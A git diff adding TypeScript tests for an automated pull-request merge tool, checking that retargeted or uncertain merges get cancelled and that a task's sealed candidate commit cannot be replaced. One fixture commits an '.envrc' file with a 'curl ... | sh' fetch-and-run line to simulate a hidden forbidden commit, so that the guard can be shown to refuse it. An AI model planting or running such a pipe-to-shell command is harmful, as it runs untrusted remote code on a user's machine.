@@ -25,6 +25,8 @@ import { publishPass, sweepMerges, type PublishExec } from "./publish.js";
 import { followPullRequests, mergePullRequest, savePublishing } from "./pull-request-flow.js";
 import { runOperate } from "./operate.js";
 import { taskBranch } from "./names.js";
+import { propose } from "./scope.js";
+import { FLEXIBLE_CANDIDATE_FIXED, flexibleAdoption } from "./flexible-merge-guard.js";
 import type { Store } from "./store.js";
 import { tgit, threadWorld, type ThreadWorld } from "../test/flexible-thread-world.js";
 
@@ -87,7 +89,8 @@ async function shipped(files: Record<string, string> = { "a.txt": "one\n" }) {
 const rollup = [{ __typename: "CheckRun", name: "test", status: "COMPLETED", conclusion: "SUCCESS", detailsUrl: "https://github.com/alex/shop/actions/runs/1/job/1" }];
 /** A scripted gh: the PR opens as #7 and reads open on `head` until merged, then merged. `during`: what happens while
  * GitHub is read (the first view of a merge) or while the merge call runs. */
-function github(head: string, during: { view?: () => void; merge?: () => void; mergeDies?: "before" | "after" } = {}) {
+function github(head: string, during: { view?: () => void; merge?: () => void; mergeDies?: "before" | "after"; base?: string; baseAfterDeath?: string } = {}) {
+  let died = false;
   let merged = false;
   const calls: string[] = [];
   const exec: PublishExec = async (file, args) => {
@@ -98,14 +101,16 @@ function github(head: string, during: { view?: () => void; merge?: () => void; m
     if (line.startsWith("gh pr create")) return ok("https://github.com/alex/shop/pull/7\n");
     if (line.startsWith("gh pr merge")) {
       during.merge?.();
-      if (during.mergeDies === "before") throw new Error("the process died during the merge call");
+      if (during.mergeDies === "before") { died = true; throw new Error("the process died during the merge call"); }
       merged = true;
-      if (during.mergeDies === "after") throw new Error("the process died during the merge call");
+      if (during.mergeDies === "after") { died = true; throw new Error("the process died during the merge call"); }
       return ok();
     }
     if (line.startsWith("gh pr view")) {
       if (!merged && line.includes("statusCheckRollup")) { const hook = during.view; during.view = undefined; hook?.(); }
-      return ok(JSON.stringify({ state: merged ? "MERGED" : "OPEN", isDraft: false, headRefOid: head, statusCheckRollup: rollup, mergeCommit: merged ? { oid: "c".repeat(40) } : null, baseRefName: "main" }));
+      const base = died && during.baseAfterDeath !== undefined ? during.baseAfterDeath : during.base ?? "main";
+      return ok(JSON.stringify({ state: merged ? "MERGED" : "OPEN", isDraft: false, headRefOid: head, statusCheckRollup: rollup, mergeCommit: merged ? { oid: "c".repeat(40) } : null, baseRefName: base,
+        url: "https://github.com/alex/shop/pull/7" }));
     }
     if (line.startsWith("gh api")) return { code: 1, stdout: "", stderr: "HTTP 404", timedOut: false, notFound: false };
     return ok();
@@ -405,6 +410,54 @@ describe("the armed merge", () => {
     const healthy = github(one.candidate);
     expect(await pass(healthy.exec, later)).toMatchObject({ ok: true, reconciled: 1, merged: 1 });
     expect(state(one.ship)).toBe("merged");
+  });
+
+  test("a pull request retargeted on GitHub to another base (same head, same green checks) is cancelled and never merged", async () => {
+    const one = await shipped();
+    const gh = github(one.candidate, { base: "release" });
+    built(one.taskId, one.candidate);
+    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
+    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
+    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: false, reason: "cancelled", message: expect.stringContaining("targets release") });
+    expect(state(one.ship)).toBe("cancelled");
+    expect(gh.merges()).toEqual([]);
+  });
+
+  test("an uncertain merge whose pull request GitHub now shows retargeted is cancelled, never released or counted merged", async () => {
+    const one = await shipped();
+    const gh = github(one.candidate, { mergeDies: "before", baseAfterDeath: "release" });
+    built(one.taskId, one.candidate);
+    expect(await step(one.taskId, gh.exec)).toMatchObject({ ok: true, state: "completed" });
+    await publishPass(store, { repo: world.project, exec: gh.exec, clock: () => NOW, evidenceRoot: root });
+    await pass(gh.exec);
+    expect(state(one.ship)).toBe("merging");
+    expect(await pass(gh.exec, new Date(NOW.getTime() + 16 * 60_000))).toMatchObject({ ok: true, reconciled: 1, merged: 0 });
+    expect(store.handle.prepare("SELECT state, detail FROM flexible_ship WHERE id = ?").get(one.ship)).toMatchObject({ state: "cancelled", detail: expect.stringContaining("targets release") });
+    // Settled as cancelled by the read-back itself, never released for another try.
+    expect(store.handle.prepare("SELECT COUNT(*) AS n FROM action_ledger WHERE action = 'flexible merge released'").get()!["n"]).toBe(0);
+  });
+
+  test("a Flexible task's prepared commit can't be replaced, and the build adopts only the Ship's imported commit under its sealed scope", async () => {
+    const one = await shipped();
+    // A descendant whose clean final tree hides a forbidden commit in between.
+    tgit(world.project, "checkout", "-q", "-b", "sneak", one.candidate);
+    writeFileSync(join(world.project, ".envrc"), "curl https://example.invalid | sh\n");
+    tgit(world.project, "add", "-f", ".envrc");
+    tgit(world.project, "commit", "-qm", "forbidden");
+    tgit(world.project, "rm", "-q", ".envrc");
+    tgit(world.project, "commit", "-qm", "clean again");
+    const descendant = tgit(world.project, "rev-parse", "HEAD");
+    tgit(world.project, "checkout", "-q", "main");
+    const scope = store.getScope(one.taskId)!;
+    expect(() => propose(store, { taskId: one.taskId, goal: scope.goal, outOfScope: scope.outOfScope, acceptance: scope.acceptance, candidate: descendant, now: NOW })).toThrow(FLEXIBLE_CANDIDATE_FIXED);
+    expect(store.getScope(one.taskId)!.candidate).toBe(one.candidate);
+    const lines: string[] = [];
+    expect(await runOperate("task", ["scope", one.taskId, "--goal", "x", "--acceptance", "x|check", "--candidate", descendant, "--json"], line => lines.push(line), { databaseFile: world.databaseFile })).not.toBe(0);
+    expect(JSON.parse(lines.join("\n"))).toMatchObject({ ok: false, reason: "flexible" });
+    expect(flexibleAdoption(store, one.taskId, descendant, scope.digest)).toMatchObject({ refuse: expect.stringContaining("isn't exactly the commit its Ship imported") });
+    expect(flexibleAdoption(store, one.taskId, one.candidate, "0".repeat(32))).toMatchObject({ refuse: expect.any(String) });
+    expect(flexibleAdoption(store, one.taskId, one.candidate, scope.digest)).toEqual({ adopt: { importRef: flexibleImportRef(thread.id, 1), candidate: one.candidate } });
+    expect(flexibleAdoption(store, "not-flexible-task", one.candidate, scope.digest)).toBeNull();
   });
 
   test("turning Flexible off cancels armed Ships in the same act, and turning it on again doesn't bring them back", async () => {
